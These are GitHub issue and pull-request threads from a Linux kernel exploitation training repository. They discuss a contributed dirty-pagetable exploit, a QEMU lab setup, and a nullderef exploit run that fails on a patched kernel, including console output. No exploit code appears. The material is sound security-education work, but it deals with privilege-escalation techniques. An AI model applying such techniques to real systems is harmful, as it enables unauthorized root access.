Hi, I recently saw your cross-cache attack in `drill_exploit_uaf_write.c`, I decided to take it as a basis and made an impelment of the dirty pagetable technique. At the moment my code can handle the rewriting of regular PTE records, also huge pages are planned to do! Hope I did well, this is my first exploit, really looking forward to your review!

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-03-14 16:31](https://github.com/a13xp0p0v/kernel-hack-drill/pull/4#issuecomment-2725191368):

Hello @Willenst,

Cool, thanks 👍

Let me take some time for the review.

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-04-24 04:14](https://github.com/a13xp0p0v/kernel-hack-drill/pull/4#issuecomment-2826325699):

Hello @Willenst,

Good work.

I did some refactoring. Could you do some improvements as well?

1) Please rebase your changes onto the fresh master branch

2) Reorder definitions of your functions according the order they are called

3) Get rid of `exit()`, please handle the errors properly

4) Please fix the style (maybe using `clang-format`)

5) Keep minimal diff from `drill_uaf_write_pipe_buffer.c`

Thank you very much!

#### <img src="https://avatars.githubusercontent.com/u/67371653?u=f5d8536b55c751c2bdb6358897d72523a01006a2&v=4" width="50">[Willenst](https://github.com/Willenst) commented at [2025-04-25 07:57](https://github.com/a13xp0p0v/kernel-hack-drill/pull/4#issuecomment-2829657094):

Hello @a13xp0p0v 

Thank you for your feedback and the refactoring you’ve done. I’ve implemented the following changes as per your request:
1. Rebased my changes onto the latest master branch.
2. Reordered function definitions to follow the order in which they are called.
3. Replaced `exit()` with similar to other PoC error handlings.
4. Used `clang-format` to clean up and standardize the code style. I tried to follow Linux style, hope it looks fine.
5. Tried to make the changes with minimal diff from `drill_uaf_write_pipe_buffer.c`, as requested.

Please let me know if any further adjustments are needed.

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-04-30 23:58](https://github.com/a13xp0p0v/kernel-hack-drill/pull/4#issuecomment-2843756383):

Cool, thanks for the refactoring, @Willenst,

I'm going to push some improvements to your branch.

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-05-13 08:50](https://github.com/a13xp0p0v/kernel-hack-drill/pull/4#issuecomment-2875596964):

@Willenst, I did some more refactoring work and merged your branch.

Congratulations and thanks for the collaboration!


-------------------------------------------------------------------------------

# [\#2 Issue](https://github.com/a13xp0p0v/kernel-hack-drill/issues/2) `closed`: Comments needed for my fork repository

#### <img src="https://avatars.githubusercontent.com/u/6214861?u=ec2b686637ad19d7b82d0c23e09de1c9d293fa90&v=4" width="50">[mudongliang](https://github.com/mudongliang) opened issue at [2020-09-16 13:48](https://github.com/a13xp0p0v/kernel-hack-drill/issues/2):

[My fork repository](https://github.com/mudongliang/kernel-hack-drill) prepares QEMU VM as the environment for those Linux kernel exploitation experiments. All the detailed processes are shown in the README.md. And I could reproduce those crashes in my own QEMU VM.

I create this issue to kindly request comments for my fork repository.






-------------------------------------------------------------------------------

# [\#1 Issue](https://github.com/a13xp0p0v/kernel-hack-drill/issues/1) `closed`: nullderef exploit does not work on my Qemu VM

#### <img src="https://avatars.githubusercontent.com/u/6214861?u=ec2b686637ad19d7b82d0c23e09de1c9d293fa90&v=4" width="50">[mudongliang](https://github.com/mudongliang) opened issue at [2020-09-16 09:47](https://github.com/a13xp0p0v/kernel-hack-drill/issues/1):

The UAF exploit is successfully launched on my Qemu VM and I see the uid changes to 0.

But for the second exploit, after applying the trick at [1], the NULL memory area is still not writable and then Segmentation fault occurs.

```
drill@syzkaller:~$ ./drill_exploit_nullderef 
begin as: uid=1000, euid=1000
payload address: 0x55b911775349
[+] /proc/$PPID/maps:
00010000-00011000 rw-p 00000000 00:00 0 
Segmentation fault
```
## My configuration
Kernel version: 5.8.9
Command line: pti=off oops=panic ftrace_dump_on_oops nokaslr
Normal user: uid=1000, euid=1000

If you need any more information, please let me know.

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2020-09-16 12:03](https://github.com/a13xp0p0v/kernel-hack-drill/issues/1#issuecomment-693360310):

Hi @mudongliang,

I think it doesn't work because your kernel has a fix for this vulnerability.
Please check https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2 for more details.

Best regards,
Alexander

#### <img src="https://avatars.githubusercontent.com/u/6214861?u=ec2b686637ad19d7b82d0c23e09de1c9d293fa90&v=4" width="50">[mudongliang](https://github.com/mudongliang) commented at [2020-09-16 12:20](https://github.com/a13xp0p0v/kernel-hack-drill/issues/1#issuecomment-693368285):

Thanks very much. It is fixed in 5.0.0-rc8. I will try an old version and test it again.
BTW, do you know some other simple exploits(maybe toy) for Linux kernel? I want to learn some exploitation techniques for Linux kernel.

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2020-09-16 12:27](https://github.com/a13xp0p0v/kernel-hack-drill/issues/1#issuecomment-693371853):

> I want to learn some exploitation techniques for Linux kernel.

I would recommend checking https://www.root-me.org/en/Challenges/App-System/

Also feel free to send pull requests with new exploits to this repository!


-------------------------------------------------------------------------------

